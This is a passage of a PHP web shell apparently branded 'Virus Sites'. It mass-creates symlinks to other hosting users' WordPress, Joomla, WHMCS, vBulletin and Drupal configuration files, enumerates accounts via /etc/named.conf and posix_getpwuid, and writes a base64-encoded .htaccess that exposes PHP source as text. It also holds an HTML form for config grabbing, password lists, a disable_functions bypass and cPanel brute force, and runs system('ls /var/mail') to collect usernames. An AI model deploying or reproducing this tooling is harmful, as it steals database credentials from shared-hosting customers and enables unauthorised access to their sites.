		symlink('/home2/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home2/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home2/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home2/'.$usern.'/public_html/main/configuration.php',$pdomain.'~~Joomla4.txt');
		symlink('/home2/'.$usern.'/public_html/home/configuration.php',$pdomain.'~~Joomla5.txt');
		symlink('/home2/'.$usern.'/public_html/site/configuration.php',$pdomain.'~~Joomla6.txt');
		symlink('/home2/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home2/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home2/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home2/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home2/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home2/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home2/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home2/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home2/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home2/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~Other1.txt');
		symlink('/home2/'.$usern.'/public_html/admin/config.php',$pdomain.'~~Other2.txt');
		symlink('/home2/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~Other3.txt');
		symlink('/home2/'.$usern.'/public_html/connect.php',$pdomain.'~~Other4.txt');
		symlink('/home2/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home2/'.$usern.'/public_html/include/config.php',$pdomain.'~~Other5.txt');
		symlink('/home2/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home2/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home3/'.$usern.'/public_html/inc/config.php',$pdomain.'~~MyBB.txt');
		symlink('/home3/'.$usern.'/public_html/sites/default/settings.php',$pdomain.'~~Drupal.txt');
		symlink('/home3/'.$usern.'/public_html/includes/configure.php',$pdomain.'~~Oscommerce.txt');
		symlink('/home3/'.$usern.'/public_html/lib/config.php',$pdomain.'~~Balitbang.txt');
		symlink('/home3/'.$usern.'/public_html/config/koneksi.php',$pdomain.'~~Lokomedia.txt');
		symlink('/home3/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home3/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home3/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home3/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home3/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home3/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home3/'.$usern.'/public_html/wp/wp-config.php',$pdomain.'~~Wordpress3.txt');
		symlink('/home3/'.$usern.'/public_html/home/wp-config.php',$pdomain.'~~Wordpress4.txt');
		symlink('/home3/'.$usern.'/public_html/main/wp-config.php',$pdomain.'~~Wordpress5.txt');
		symlink('/home3/'.$usern.'/public_html/site/wp-config.php',$pdomain.'~~Wordpress6.txt');
		symlink('/home3/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home3/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home3/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home3/'.$usern.'/public_html/main/configuration.php',$pdomain.'~~Joomla4.txt');
		symlink('/home3/'.$usern.'/public_html/home/configuration.php',$pdomain.'~~Joomla5.txt');
		symlink('/home3/'.$usern.'/public_html/site/configuration.php',$pdomain.'~~Joomla6.txt');
		symlink('/home3/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home3/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home3/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home3/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home3/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home3/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home3/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home3/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home3/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home3/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~Other1.txt');
		symlink('/home3/'.$usern.'/public_html/admin/config.php',$pdomain.'~~Other2.txt');
		symlink('/home3/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~Other3.txt');
		symlink('/home3/'.$usern.'/public_html/connect.php',$pdomain.'~~Other4.txt');
		symlink('/home3/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home3/'.$usern.'/public_html/include/config.php',$pdomain.'~~Other5.txt');
		symlink('/home3/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home3/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home4/'.$usern.'/public_html/inc/config.php',$pdomain.'~~MyBB.txt');
		symlink('/home4/'.$usern.'/public_html/sites/default/settings.php',$pdomain.'~~Drupal.txt');
		symlink('/home4/'.$usern.'/public_html/includes/configure.php',$pdomain.'~~Oscommerce.txt');
		symlink('/home4/'.$usern.'/public_html/lib/config.php',$pdomain.'~~Balitbang.txt');
		symlink('/home4/'.$usern.'/public_html/config/koneksi.php',$pdomain.'~~Lokomedia.txt');
		symlink('/home4/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home4/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home4/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home4/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home4/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home4/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home4/'.$usern.'/public_html/wp/wp-config.php',$pdomain.'~~Wordpress3.txt');
		symlink('/home4/'.$usern.'/public_html/home/wp-config.php',$pdomain.'~~Wordpress4.txt');
		symlink('/home4/'.$usern.'/public_html/main/wp-config.php',$pdomain.'~~Wordpress5.txt');
		symlink('/home4/'.$usern.'/public_html/site/wp-config.php',$pdomain.'~~Wordpress6.txt');
		symlink('/home4/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home4/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home4/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home4/'.$usern.'/public_html/main/configuration.php',$pdomain.'~~Joomla4.txt');
		symlink('/home4/'.$usern.'/public_html/home/configuration.php',$pdomain.'~~Joomla5.txt');
		symlink('/home4/'.$usern.'/public_html/site/configuration.php',$pdomain.'~~Joomla6.txt');
		symlink('/home4/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home4/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home4/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home4/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home4/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home4/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home4/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home4/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home4/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home4/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~Other1.txt');
		symlink('/home4/'.$usern.'/public_html/admin/config.php',$pdomain.'~~Other2.txt');
		symlink('/home4/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~Other3.txt');
		symlink('/home4/'.$usern.'/public_html/connect.php',$pdomain.'~~Other4.txt');
		symlink('/home4/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home4/'.$usern.'/public_html/include/config.php',$pdomain.'~~Other5.txt');
		symlink('/home4/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home4/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home5/'.$usern.'/public_html/inc/config.php',$pdomain.'~~MyBB.txt');
		symlink('/home5/'.$usern.'/public_html/sites/default/settings.php',$pdomain.'~~Drupal.txt');
		symlink('/home5/'.$usern.'/public_html/includes/configure.php',$pdomain.'~~Oscommerce.txt');
		symlink('/home5/'.$usern.'/public_html/lib/config.php',$pdomain.'~~Balitbang.txt');
		symlink('/home5/'.$usern.'/public_html/config/koneksi.php',$pdomain.'~~Lokomedia.txt');
		symlink('/home5/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home5/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home5/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home5/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home5/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home5/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home5/'.$usern.'/public_html/wp/wp-config.php',$pdomain.'~~Wordpress3.txt');
		symlink('/home5/'.$usern.'/public_html/home/wp-config.php',$pdomain.'~~Wordpress4.txt');
		symlink('/home5/'.$usern.'/public_html/main/wp-config.php',$pdomain.'~~Wordpress5.txt');
		symlink('/home5/'.$usern.'/public_html/site/wp-config.php',$pdomain.'~~Wordpress6.txt');
		symlink('/home5/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home5/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home5/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home5/'.$usern.'/public_html/main/configuration.php',$pdomain.'~~Joomla4.txt');
		symlink('/home5/'.$usern.'/public_html/home/configuration.php',$pdomain.'~~Joomla5.txt');
		symlink('/home5/'.$usern.'/public_html/site/configuration.php',$pdomain.'~~Joomla6.txt');
		symlink('/home5/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home5/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home5/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home5/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home5/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home5/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home5/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home5/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home5/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home5/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~Other1.txt');
		symlink('/home5/'.$usern.'/public_html/admin/config.php',$pdomain.'~~Other2.txt');
		symlink('/home5/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~Other3.txt');
		symlink('/home5/'.$usern.'/public_html/connect.php',$pdomain.'~~Other4.txt');
		symlink('/home5/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home5/'.$usern.'/public_html/include/config.php',$pdomain.'~~Other5.txt');
		symlink('/home5/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home5/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home6/'.$usern.'/public_html/inc/config.php',$pdomain.'~~MyBB.txt');
		symlink('/home6/'.$usern.'/public_html/sites/default/settings.php',$pdomain.'~~Drupal.txt');
		symlink('/home6/'.$usern.'/public_html/includes/configure.php',$pdomain.'~~Oscommerce.txt');
		symlink('/home6/'.$usern.'/public_html/lib/config.php',$pdomain.'~~Balitbang.txt');
		symlink('/home6/'.$usern.'/public_html/config/koneksi.php',$pdomain.'~~Lokomedia.txt');
		symlink('/home6/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home6/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home6/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home6/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home6/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home6/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home6/'.$usern.'/public_html/wp/wp-config.php',$pdomain.'~~Wordpress3.txt');
		symlink('/home6/'.$usern.'/public_html/home/wp-config.php',$pdomain.'~~Wordpress4.txt');
		symlink('/home6/'.$usern.'/public_html/main/wp-config.php',$pdomain.'~~Wordpress5.txt');
		symlink('/home6/'.$usern.'/public_html/site/wp-config.php',$pdomain.'~~Wordpress6.txt');
		symlink('/home6/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home6/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home6/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home6/'.$usern.'/public_html/main/configuration.php',$pdomain.'~~Joomla4.txt');
		symlink('/home6/'.$usern.'/public_html/home/configuration.php',$pdomain.'~~Joomla5.txt');
		symlink('/home6/'.$usern.'/public_html/site/configuration.php',$pdomain.'~~Joomla6.txt');
		symlink('/home6/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home6/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home6/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home6/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home6/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home6/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home6/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home6/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home6/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home6/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~Other1.txt');
		symlink('/home6/'.$usern.'/public_html/admin/config.php',$pdomain.'~~Other2.txt');
		symlink('/home6/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~Other3.txt');
		symlink('/home6/'.$usern.'/public_html/connect.php',$pdomain.'~~Other4.txt');
		symlink('/home6/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home6/'.$usern.'/public_html/include/config.php',$pdomain.'~~Other5.txt');
		symlink('/home6/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home6/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home7/'.$usern.'/public_html/inc/config.php',$pdomain.'~~MyBB.txt');
		symlink('/home7/'.$usern.'/public_html/sites/default/settings.php',$pdomain.'~~Drupal.txt');
		symlink('/home7/'.$usern.'/public_html/includes/configure.php',$pdomain.'~~Oscommerce.txt');
		symlink('/home7/'.$usern.'/public_html/lib/config.php',$pdomain.'~~Balitbang.txt');
		symlink('/home7/'.$usern.'/public_html/config/koneksi.php',$pdomain.'~~Lokomedia.txt');
		symlink('/home7/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home7/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home7/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home7/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home7/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home7/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home7/'.$usern.'/public_html/wp/wp-config.php',$pdomain.'~~Wordpress3.txt');
		symlink('/home7/'.$usern.'/public_html/home/wp-config.php',$pdomain.'~~Wordpress4.txt');
		symlink('/home7/'.$usern.'/public_html/main/wp-config.php',$pdomain.'~~Wordpress5.txt');
		symlink('/home7/'.$usern.'/public_html/site/wp-config.php',$pdomain.'~~Wordpress6.txt');
		symlink('/home7/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home7/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home7/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home7/'.$usern.'/public_html/main/configuration.php',$pdomain.'~~Joomla4.txt');
		symlink('/home7/'.$usern.'/public_html/home/configuration.php',$pdomain.'~~Joomla5.txt');
		symlink('/home7/'.$usern.'/public_html/site/configuration.php',$pdomain.'~~Joomla6.txt');
		symlink('/home7/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home7/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home7/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home7/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home7/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home7/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home7/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home7/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home7/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home7/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~Other1.txt');
		symlink('/home7/'.$usern.'/public_html/admin/config.php',$pdomain.'~~Other2.txt');
		symlink('/home7/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~Other3.txt');
		symlink('/home7/'.$usern.'/public_html/connect.php',$pdomain.'~~Other4.txt');
		symlink('/home7/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home7/'.$usern.'/public_html/include/config.php',$pdomain.'~~Other5.txt');
		symlink('/home7/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home7/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
	}
				$d0mains = @file("/etc/named.conf");
				if($d0mains)
				{
					mkdir($fn);
					chdir($fn);				
					foreach($d0mains as $d0main)
					{
						if(eregi("zone",$d0main))
						{
							preg_match_all('#zone "(.*)"#', $d0main, $domains);
							flush();
							if(strlen(trim($domains[1][0])) > 2)
							{ 
								$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
								syml($user['name'],$domains[1][0]);					
							}
						}
					}
					echo "<body style='background:#000000;color:#ffffff;font-size:17px;font-family:Tahoma,Verdana,Arial;'><center>[Done] : <span style='color:".$color[0].";'>Successfull, </span> <a href=$fn/ style='text-decoration:none;'><input type='button' value='Go !'></a> <a href=".$_SERVER['PHP_SELF']." style='text-decoration:none;'><input type='button' value='Back !'></a></center></body>";
				}
				else
				{
					mkdir($fn);
					chdir($fn);
					$temp = "";
					$val1 = 0;
					$val2 = 1000;
					for(;$val1 <= $val2;$val1++) 
					{
						$uid = @posix_getpwuid($val1);
						if ($uid)
							$temp .= join(':',$uid)."\n";
					 }
					 echo '<br/>';
					 $temp = trim($temp);
					 $file5 = fopen("test.txt","w");
					 fputs($file5,$temp);
					 fclose($file5);
$htaccess =
'T3B0aW9ucyBhbGwgCkRpcmVjdG9yeUluZGV4IHJlYWRtZS5odG1sIApBZGRUeXBlIHRleHQvcGxh
aW4gLnBocCAKQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAgCkFkZFR5cGUgdGV4dC9wbGFp
biAuaHRtbCAKQWRkSGFuZGxlciB0eHQgLmh0bWwgClJlcXVpcmUgTm9uZSAKU2F0aXNmeSBBbnk=
';
$file = fopen(".htaccess","w+");
$write = fwrite ($file ,base64_decode($htaccess));
					 
					 $file = fopen("test.txt", "r") or exit("Unable to open file!");
					 while(!feof($file))
					 {
						$s = fgets($file);
						$matches = array();
						$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
						$matches = str_replace("home/","",$matches[1]);
						if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
							continue;
						syml($matches,$matches);
					 }
					fclose($file);
					echo "</table>";
					unlink("test.txt");
					echo "<body style='background:#000000;color:#ffffff;font-size:17px;font-family:Tahoma,Verdana,Arial;'><center>[Done] : <span style='color:".$color[0].";'>Successfull, </span> <a href=$fn/ style='text-decoration:none;'><input type='button' value='Go !'></a> <a href=".$_SERVER['PHP_SELF']." style='text-decoration:none;'><input type='button' value='Back !'></a></center></body>";
				}
exit;
}
?>
<form method="POST" target="_blank">
<input name="page" type="hidden" value="find">        				
    <table width="550" cellpadding="3" cellspacing="1" align="center" style="border:3px solid <?php echo $color[0]; ?>;" border=1>
    <tr>
        <td valign="top" colspan="6" style="border-bottom:2px solid <?php echo $color[0]; ?>;padding:10px;"><center><span style="font-family: Verdana;font-size:30px;font-weight:bold;text-shadow: <?php echo $color[0]; ?> 0.0em 0.0em 0.2em;">CPanel Bruteforce |Virus Sites</span><br>
		</center></td>
    </tr>
    <tr>
    <td valign="top" style="width: 200px;"><span class="label">Safe Mode</span></td>
    <td valign="top" colspan="5"><span class="label">
<?php
$safe_mode = ini_get('safe_mode');
if($safe_mode=='1')
{
echo 'ON';
}else{
echo 'OFF';
}
?>	
	</span>
	</td>
    </tr>
</form>
    <tr>
    <td valign="top"><span class="label">Disable Function</span></td>
    <td valign="top" colspan="5">
<form method="POST" target="_blank">
<input name="matikan" type="hidden" value="sekatan">        				
<?php
if(''==($func=@ini_get('disable_functions')))
{
echo "<font color='".$color[0]."' style='position:absolute;font-size:13px;'>No Security for Function</font>";
echo '<tr><td valign="top"><span class="label">Bypass</span></td><td valign="top" colspan="5"><font color="'.$color[0].'" style="font-size:13px;">Success</font></td></tr>';
}else{
echo '<script>alert("\t Please See Below And Press \t \n \t --->| Click Here First! |<--- \t");</script>';
echo "<font color=#FF0000 style='position:relatif;font-size:13px;'>$func</font>";
echo '<tr><td valign="top"><span class="label">Bypass</span></td><td valign="top" colspan="5"><input type="submit" value="Click Here First!"></td></tr>';
}
?></form></td>
<form method="POST" target="_blank">
<input name="mendapatkan" type="hidden" value="passwd">        				
    <tr>
    <td valign="top"><span class="label">Get Config</span></td>
    <td valign="top"><input size="35" name="foldername" type="text" value="create_name_folder_config"> <input type="submit" value="Submit"></td>
    </td>
    </tr>
</form>
<form method="POST" target="_blank">
<input name="pass1" type="hidden" value="password">        				
    <tr>
    <td valign="top"><span class="label">Get Passlist</span></td>
    <td valign="top"><input size="35" name="url" type="text" value="url_of_config"> <input type="submit" value="Submit"></td>
    </td>
    </tr>
</form>
    <tr>
    <td valign="top">
	<span class="label">Userlist</span></td>
    <td valign="top" colspan="5"><textarea cols="40" rows="7" name="usernames"><?php system('ls /var/mail');?></textarea></td>
    </tr>
    <tr>
    <td valign="top">
	<span class="label">Passlist</span></td>
    <td valign="top"colspan="5"><textarea cols="40" rows="7" name="passwords"></textarea></td>
    </tr>
    <tr>
    <td valign="top">
	<span class="label">Type</span></td>
    <td valign="top" colspan="5">
	<input type="radio" name="type" value="simple" checked="checked"><span class="label">Simple</span>
	<input type="radio" name="type" value="passwd"><span class="label">/etc/passwd</span>
    </td>
    </tr>
    <tr>
    <td valign="top" colspan="6"><center><input type="submit" value="Submit"></center></td>
    </tr>
</form>
<tr>
<td valign="top" colspan="6" style="border-top:2px solid <?php echo $color[0]; ?>;"><center><font face="Verdana" color="#e1e1e1" size="2" style="margin:7px;">Allright Reserved &copy; Virus Sites</font></center></td>
</tr>
</table>
</body>
</html>

 